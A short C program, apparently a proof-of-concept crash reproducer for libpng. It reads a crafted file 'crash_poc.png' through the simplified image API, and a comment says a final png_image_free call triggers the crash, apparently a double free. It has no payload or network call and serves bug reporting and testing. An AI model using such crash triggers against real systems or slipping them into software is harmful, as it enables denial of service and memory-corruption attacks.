#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <png.h>
//THIS FILE IS NOT USED BUT IT IS THE POC USED DIRECTLY INTO THE SCRIPT 
int main() {
    printf("libpng version: %s\n", png_get_libpng_ver(NULL));
    png_image image;
    memset(&image, 0, sizeof(image));
    image.version = PNG_IMAGE_VERSION;

    // Load image metadata from a PNG file
    if (png_image_begin_read_from_file(&image, "crash_poc.png")) {
        png_bytep buffer = malloc(PNG_IMAGE_SIZE(image));
        if (buffer != NULL) {
            // Fully decode the image
            png_image_finish_read(&image, NULL, buffer, 0, NULL);
            free(buffer); // Free the decoded data
        }
    }

    // This second free triggers the crash
    png_image_free(&image);
    return 0;
}
